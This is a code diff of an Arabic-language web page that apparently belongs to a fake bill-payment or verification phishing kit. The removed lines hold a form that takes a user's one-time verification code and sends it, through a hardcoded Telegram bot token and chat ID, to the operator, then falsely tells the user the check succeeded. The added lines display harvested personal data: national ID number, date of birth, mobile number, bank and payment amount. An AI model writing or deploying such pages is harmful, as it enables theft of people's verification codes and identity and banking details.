@@ -1,44 +1,66 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>التحقق</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>التأكد من البيانات</title>
   <style>
-    body {font-family: Tahoma, Arial; background:#f5fff5; margin:0; padding:0;}
-    .container {max-width:400px; margin:50px auto; background:#eaffea; padding:25px; border-radius:12px; box-shadow:0 4px 8px rgba(0,0,0,0.1);}
-    h2 {text-align:center; color:#2b7a2b; margin-bottom:20px;}
-    label {display:block; margin-bottom:8px; font-weight:bold; color:#333;}
-    input, button {width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:6px; font-size:15px;}
-    button {background:#2b7a2b; color:white; font-weight:bold; cursor:pointer; border:none;}
-    button:hover {background:#1c551c;}
+    body {font-family: Arial, sans-serif; direction: rtl; background-color: #f5f5f5; margin: 0; padding: 0;}
+    header, footer { background-color: #004080; color: white; text-align: center; padding: 20px 0; }
+    main { padding: 20px; }
+    .summary { background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px dashed #eee; }
+    .label { font-weight: bold; }
+    .value { font-weight: normal; }
+    button { padding: 10px 20px; background-color: #004080; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+    button:hover { background-color: #003366; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>التحقق</h2>
-    <label for="code">أدخل كود التحقق</label>
-    <input type="text" id="code" placeholder="ادخل الكود المرسل">
 
-    <button onclick="sendVerify()">تأكيد</button>
-  </div>
+  <header>
+    <h2>التأكد من البيانات</h2>
+  </header>
+
+  <main>
+    <div class="summary" id="summaryBox">
+      <!-- سيتم ملؤها عبر جافاسكربت -->
+    </div>
+
+    <button id="finalSubmit">متابعة</button>
+  </main>
+
+  <footer>
+    جميع الحقوق محفوظة © 2025
+  </footer>
 
   <script>
-    const BOT_TOKEN = "7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E";
-    const CHAT_ID = "16420566";
+    // تحميل البيانات من sessionStorage
+    const formData = JSON.parse(sessionStorage.getItem('formData'));
 
-    function sendVerify() {
-      const code = document.getElementById("code").value;
-
-      const message = `✅ تم إدخال كود التحقق:\nالكود: ${code}`;
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({chat_id: CHAT_ID, text: message})
-      }).then(() => {
-        alert("تم التحقق بنجاح ✅");
-      });
+    if (formData) {
+      const summaryBox = document.getElementById('summaryBox');
+      summaryBox.innerHTML = `
+        <div class="row"><div class="label">الاسم بالكامل</div><div class="value">${formData.fullName}</div></div>
+        <div class="row"><div class="label">رقم الهوية</div><div class="value">${formData.idNumber}</div></div>
+        <div class="row"><div class="label">تاريخ الميلاد</div><div class="value">${formData.dob}</div></div>
+        <div class="row"><div class="label">رقم الجوال</div><div class="value">${formData.mobile}</div></div>
+        <div class="row"><div class="label">البنك</div><div class="value">${formData.bank}</div></div>
+        <div class="row"><div class="label">قيمة السداد</div><div class="value">${formData.amount} درهم</div></div>
+        <div class="row"><div class="label">رقم المفوتر</div><div class="value">${formData.invoiceNumber}</div></div>
+      `;
+    } else {
+      document.body.innerHTML = '<h2>لم يتم العثور على البيانات</h2>';
     }
+
+    // بعد التحقق، الانتقال إلى الصفحة التالية
+    document.getElementById('finalSubmit').addEventListener('click', function() {
+      sessionStorage.removeItem('formData');
+      alert('تمت العملية بنجاح!');
+      // يمكنك هنا الانتقال إلى صفحة أخرى مثل صفحة شكرًا أو صفحة تأكيد
+      window.location.href = 'confirmation.html';  // استبدل بـ URL صفحة التأكيد إذا لزم الأمر
+    });
   </script>
+
 </body>
 </html>
